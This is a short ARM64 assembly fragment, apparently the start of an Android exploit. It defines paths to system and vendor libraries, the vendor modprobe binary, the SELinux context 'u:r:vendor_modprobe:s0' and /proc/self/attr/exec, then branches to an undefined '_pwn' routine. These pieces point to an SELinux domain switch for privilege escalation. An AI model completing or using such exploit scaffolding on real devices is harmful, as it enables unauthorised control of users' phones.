.global _start
.global _pwn

_bridge:
    .asciz "/system/lib64/libtracingproxy.so"

_ko_lib:
    .asciz "/vendor/lib/libstagefright_soft_mp3dec.so"

_modprobe:
    .asciz "/vendor/bin/modprobe"

_modprobe_context:
    .asciz "u:r:vendor_modprobe:s0"

_exec_attr:
    .asciz "/proc/self/attr/exec"

_start:
    bl _pwn
